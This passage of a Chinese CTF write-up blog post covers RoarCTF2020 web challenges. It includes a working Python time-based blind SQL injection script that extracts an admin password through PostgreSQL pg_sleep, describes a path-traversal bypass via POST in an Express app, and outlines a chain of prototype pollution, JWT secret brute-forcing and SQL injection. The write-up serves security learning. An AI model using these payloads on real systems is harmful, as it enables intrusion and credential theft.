+<p>抄了一个payload，外面多套一层strpos，然后在if语句里面sleep，strpos返回一个bool值即可，通过延时来判断<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://answer-id.com/zh/51434394">https://answer-id.com/zh/51434394</a> 九年前的远古操作了<br>稍微改一下payload</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests
+<span class="token keyword">import</span> time
+
+url <span class="token operator">=</span> <span class="token string">"http://139.129.98.9:30007/"</span>
+result <span class="token operator">=</span> <span class="token string">""</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token comment" spellcheck="true"># 二分查找提高效率</span>
+    p <span class="token operator">=</span> <span class="token number">0</span>
+    q <span class="token operator">=</span> <span class="token number">256</span>
+    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
+        m <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">+</span> q<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>
+        payload <span class="token operator">=</span> <span class="token string">"1'or(strpos((select/**/case/**/when/**/("</span> \
+                  <span class="token string">"(select/**/ascii(substr(password,{},1))/**/from/**/users/**/where/**/username='admin'/**/limit/**/1/**/OFFSET/**/0)between/**/{}/**/and/**/127"</span> \
+                  <span class="token string">")/**/then(pg_sleep(3))else(pg_sleep(0))end)::text,'1')=0)--/**/"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span>
+        <span class="token comment" spellcheck="true"># print(m)</span>
+        data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"admin"</span><span class="token punctuation">,</span> <span class="token string">"password"</span><span class="token punctuation">:</span> payload<span class="token punctuation">}</span>
+        start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token punctuation">)</span>
+        end <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
+        <span class="token keyword">if</span> end<span class="token operator">-</span>start <span class="token operator">></span> <span class="token number">2</span><span class="token punctuation">:</span>  <span class="token comment" spellcheck="true"># 条件中结果为真</span>
+            p <span class="token operator">=</span> m
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            q <span class="token operator">=</span> m
+        <span class="token keyword">if</span> p <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">==</span> q<span class="token punctuation">:</span>
+            result <span class="token operator">+=</span> chr<span class="token punctuation">(</span>p<span class="token punctuation">)</span>
+            <span class="token keyword">break</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>
+</code></pre>
+<p>数据库结构肯定没变，直接梭最后的密码，不然时间盲注还等你慢慢注注老了<br>这把的密码变成了S0rryF0Rm1st4ke111<br>sorry for mistake</p>
+<p>这个解算是非预期，虽然也是很正常的操作吧。。。因为把pg_sleep()强制转到文本了然后作比较就能返回bool，看Y1ng的意思应该是在then里面不直接写pg_sleep，而是再来一层(select 123 from pg_sleep(5))，这种语句是可以的，并且返回数字123</p>
+<p>我又学会一点东西呜呜</p>
+<h2 id="badhack"><a href="#badhack" class="headerlink" title="badhack"></a>badhack</h2><p>看了一眼，说是个web题，其实是个RE，变量命名都是寄存器，然后一通移位异或各种操作，真当我没见过RE爷爷做题的时候什么样子吗，直接进行一个跳过<br>今天RE爷爷都咕了呜呜</p>
+<h2 id="HTML在线代码编辑器"><a href="#HTML在线代码编辑器" class="headerlink" title="HTML在线代码编辑器"></a>HTML在线代码编辑器</h2><p>express写的，功能就是在线运行HTML代码，view路由有一个file参数可以看文件<br>参数前面拼接了目录，..出现就被ban，感觉也没机会目录穿越啊，没时间了，结束了</p>
+<p>看了wp，有点被搞的感觉，view路由支持post和get两种方法，get方法过滤了..，但是post没有，就可以任意文件读取了？？？？？？<br>虽然说这个点是通过看前端发现有POST方式访问的，但是get post两种方式不同过滤可真是小天才<br>get的过滤</p>
+<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>is_login <span class="token operator">!==</span> <span class="token number">1</span> <span class="token operator">||</span> <span class="token operator">!</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>file <span class="token operator">||</span> <span class="token keyword">typeof</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>file <span class="token operator">!==</span> <span class="token string">'string'</span> <span class="token operator">||</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>file<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">'..'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
+</code></pre>
+<p>post的过滤</p>
+<pre class=" language-javascript"><code class="language-javascript">        <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>is_login <span class="token operator">!==</span> <span class="token number">1</span>
+            <span class="token operator">||</span> <span class="token operator">!</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>file
+            <span class="token operator">||</span> <span class="token keyword">typeof</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>file <span class="token operator">!==</span> <span class="token string">'string'</span>
+            <span class="token operator">||</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>file<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">'proc'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token operator">-</span><span class="token number">1</span>
+            <span class="token operator">||</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>file<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">'environ'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token operator">-</span><span class="token number">1</span>
+            <span class="token operator">||</span> <span class="token operator">!</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>time
+            <span class="token operator">||</span>  <span class="token punctuation">(</span> Math<span class="token punctuation">.</span><span class="token function">abs</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">ceil</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">1000</span><span class="token punctuation">)</span> <span class="token operator">-</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>time<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+</code></pre>
+<p>真是小天才</p>
+<p>然后是一个SSTI，js的SSTI不会整<br>等buu上题之后再去复现吧</p>
+<h2 id="快乐圣诞cei叮壳"><a href="#快乐圣诞cei叮壳" class="headerlink" title="快乐圣诞cei叮壳"></a>快乐圣诞cei叮壳</h2><p>这个题看了好久，源码超级长，最后还有一步注入，吐了，但是在注入前的一段就已经卡住了，不会做了</p>
+<pre class=" language-javascript"><code class="language-javascript">    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>body <span class="token operator">||</span> <span class="token keyword">typeof</span> req<span class="token punctuation">.</span>body <span class="token operator">!==</span> <span class="token string">'object'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span>
+        <span class="token keyword">return</span>
+    <span class="token punctuation">}</span>
+
+    player <span class="token operator">=</span> <span class="token punctuation">{</span>
+        name<span class="token punctuation">:</span> <span class="token string">"player"</span><span class="token punctuation">,</span>
+        award<span class="token punctuation">:</span> <span class="token string">"Turkey"</span><span class="token punctuation">,</span>
+        want_to_eat<span class="token punctuation">:</span> <span class="token string">"1"</span><span class="token punctuation">,</span>
+    <span class="token punctuation">}</span>
+
+    req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"player"</span>
+    req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>award <span class="token operator">=</span> <span class="token string">"Turkey"</span>
+    req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>want_to_eat <span class="token operator">=</span> <span class="token string">"1"</span>
+
+    <span class="token keyword">let</span> tempPlayer <span class="token operator">=</span> req<span class="token punctuation">.</span>body
+
+    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token keyword">in</span> tempPlayer<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>player<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>i <span class="token operator">===</span> <span class="token string">"name"</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">typeof</span> tempPlayer<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'string'</span><span class="token punctuation">)</span> <span class="token operator">||</span> i <span class="token operator">===</span> <span class="token string">"award"</span> <span class="token operator">||</span> <span class="token punctuation">(</span>i <span class="token operator">===</span> <span class="token string">"want_to_eat"</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>want_to_eat<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>tempPlayer<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                player <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
+                res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">"?"</span><span class="token punctuation">)</span>
+                <span class="token keyword">return</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+
+            player<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> tempPlayer<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
+
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">===</span> <span class="token string">"want_to_eat"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token keyword">switch</span> <span class="token punctuation">(</span>tempPlayer<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                    <span class="token keyword">case</span> <span class="token string">"1"</span> <span class="token punctuation">:</span>
+                        player<span class="token punctuation">.</span>award <span class="token operator">=</span> <span class="token string">"Turkey"</span><span class="token punctuation">;</span>
+                        <span class="token keyword">break</span><span class="token punctuation">;</span>
+                    <span class="token keyword">case</span> <span class="token string">"2"</span> <span class="token punctuation">:</span>
+                        player<span class="token punctuation">.</span>award <span class="token operator">=</span> <span class="token string">"Goose"</span><span class="token punctuation">;</span>
+                        <span class="token keyword">break</span><span class="token punctuation">;</span>
+                    <span class="token keyword">case</span> <span class="token string">"3"</span> <span class="token punctuation">:</span>
+                        player<span class="token punctuation">.</span>award <span class="token operator">=</span> <span class="token string">"Buchedenoel"</span><span class="token punctuation">;</span>
+                        <span class="token keyword">break</span><span class="token punctuation">;</span>
+                    <span class="token keyword">case</span> <span class="token string">"4"</span> <span class="token punctuation">:</span>
+                        player<span class="token punctuation">.</span>award <span class="token operator">=</span> <span class="token string">"Corn porridge"</span><span class="token punctuation">;</span>
+                        <span class="token keyword">break</span><span class="token punctuation">;</span>
+                <span class="token punctuation">}</span>
+            <span class="token punctuation">}</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">const</span> token <span class="token operator">=</span> jwt<span class="token punctuation">.</span><span class="token function">sign</span><span class="token punctuation">(</span>
+        <span class="token punctuation">{</span>
+            id<span class="token punctuation">:</span> player<span class="token punctuation">.</span>want_to_eat<span class="token punctuation">,</span>
+            is_win<span class="token punctuation">:</span> <span class="token string">"false"</span>
+        <span class="token punctuation">}</span><span class="token punctuation">,</span> env<span class="token punctuation">.</span>parsed<span class="token punctuation">.</span>rockyou<span class="token punctuation">,</span> <span class="token punctuation">{</span>
+            expiresIn<span class="token punctuation">:</span> <span class="token number">3600</span> <span class="token operator">*</span> <span class="token number">12</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">)</span>
+    res<span class="token punctuation">.</span><span class="token function">cookie</span><span class="token punctuation">(</span><span class="token string">"token"</span><span class="token punctuation">,</span> token<span class="token punctuation">,</span> <span class="token punctuation">{</span>
+        maxAge<span class="token punctuation">:</span> <span class="token number">3600</span> <span class="token operator">*</span> <span class="token number">12</span><span class="token punctuation">,</span>
+        httpOnly<span class="token punctuation">:</span> <span class="token boolean">true</span>
+    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</code></pre>
+<p>要是能控制player的want_to_eat就好了<br>卡死了，不会</p>
+<p>比赛结束了，不出我所料这个题是y1ng出的，这里没法控制want_to_eat，直接进行一个rockyou字典的爆破，说是说这个变量名叫rockyou提示的是这个字典，但是我不知道有这个字典啊。。。。感觉就硬多整一环，结果成了个脑洞</p>
+<p>由于player处没有win这个属性，可以进行一个类似原型链污染的操作，通过直接修改单个对象的原型增加属性，可以硬加一个win属性上去，但是want_to_eat绝对无法控制，需要用它给的这个字典爆破jwt的secret，最后到一步SQL注入。。。</p>
+<p>感觉这个题思路并不好，三个点难度都不大，没有特别惊艳的利用，就是简单堆叠套娃，然后这步爆破提示也给的有点诡异，就好端端的突然变成脑洞题卡住一堆人<br>研究字典怎么用去了</p>
+<h2 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h2><p>y1ng师傅的wp<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.gem-love.com/ctf/2702.html">https://www.gem-love.com/ctf/2702.html</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/SQLI/" rel="tag"># SQLI</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/%5BN1CTF2020%5DDockerManager.html" rel="prev" title="[N1CTF2020]DockerManager">
+      <i class="fa fa-chevron-left"></i> [N1CTF2020]DockerManager
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/%5BC1CTF2020%5Dwp.html" rel="next" title="[C1CTF2020]wp">
+      [C1CTF2020]wp <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#RoarCTF2020-wp"><span class="nav-number">1.</span> <span class="nav-text">[RoarCTF2020]wp</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AD%BE%E5%88%B0"><span class="nav-number">1.1.</span> <span class="nav-text">签到</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ezsql"><span class="nav-number">1.2.</span> <span class="nav-text">ezsql</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%B2%E6%B3%A8%E8%B7%91password"><span class="nav-number">1.2.1.</span> <span class="nav-text">盲注跑password</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="nav-number">1.2.2.</span> <span class="nav-text">堆叠注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MySQL8%E6%96%B0%E6%93%8D%E4%BD%9C"><span class="nav-number">1.2.3.</span> <span class="nav-text">MySQL8新操作</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E8%A1%A8%E5%90%8D"><span class="nav-number">1.2.3.1.</span> <span class="nav-text">获取表名</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%83%E7%BB%84%E5%AF%B9%E6%AF%94%E8%8E%B7%E5%8F%96%E5%88%97%E6%95%B0"><span class="nav-number">1.2.4.</span> <span class="nav-text">元组对比获取列数</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96flag"><span class="nav-number">1.2.4.1.</span> <span class="nav-text">获取flag</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E8%84%9A%E6%9C%AC"><span class="nav-number">1.2.5.</span> <span class="nav-text">注入脚本</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BD%A0%E8%83%BD%E7%99%BB%E9%99%86%E6%88%90%E5%8A%9F%E5%90%97"><span class="nav-number">1.3.</span> <span class="nav-text">你能登陆成功吗</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%B3%A8%E5%85%A5"><span class="nav-number">1.3.1.</span> <span class="nav-text">整数溢出注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#payload%E5%9F%BA%E6%9C%AC%E6%A1%86%E6%9E%B6%E6%9E%84%E9%80%A0"><span class="nav-number">1.3.2.</span> <span class="nav-text">payload基本框架构造</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%98%E5%9C%A8%E5%88%A4%E6%96%AD"><span class="nav-number">1.3.3.</span> <span class="nav-text">数据库存在判断</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E8%A1%A8%E5%90%8D-1"><span class="nav-number">1.3.4.</span> <span class="nav-text">获取表名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E5%88%97%E5%90%8D"><span class="nav-number">1.3.5.</span> <span class="nav-text">获取列名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E5%AD%97%E6%AE%B5"><span class="nav-number">1.3.6.</span> <span class="nav-text">查字段</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BD%A0%E8%83%BD%E7%99%BB%E9%99%86%E6%88%90%E5%8A%9F%E5%90%97-Revenge"><span class="nav-number">1.4.</span> <span class="nav-text">你能登陆成功吗-Revenge</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#badhack"><span class="nav-number">1.5.</span> <span class="nav-text">badhack</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HTML%E5%9C%A8%E7%BA%BF%E4%BB%A3%E7%A0%81%E7%BC%96%E8%BE%91%E5%99%A8"><span class="nav-number">1.6.</span> <span class="nav-text">HTML在线代码编辑器</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BF%AB%E4%B9%90%E5%9C%A3%E8%AF%9Ecei%E5%8F%AE%E5%A3%B3"><span class="nav-number">1.7.</span> <span class="nav-text">快乐圣诞cei叮壳</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#wp"><span class="nav-number">1.8.</span> <span class="nav-text">wp</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Z3ratu1" src="https://q2.qlogo.cn/headimg_dl?dst_uin=1207039417&spec=160">
+  <p class="site-author-name" itemprop="name">Z3ratu1</p>
+  <div class="site-description" itemprop="description">与其感慨路难行，不如现在出发</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">145</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">86</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+  <div class="beian"><a href="http://www.beian.miit.gov.cn/" rel="external nofollow noopener noreferrer" target="_blank">湘ICP备2020021580号 </a>
+      <img src="/./images/beian.png" style="display: inline-block;">
+  </div>
+
+<div class="copyright">
+  
+  &copy; 2019 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Z3ratu1</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="external nofollow noopener noreferrer" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="external nofollow noopener noreferrer" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : '7H8kg0XdWO8IbhOcu4K1JaAT-gzGzoHsz',
+      appKey     : 'wPKQjkbVtvPaRR7gh2yjfLSi',
+      placeholder: "Just go go",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : true,
+      lang       : '' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
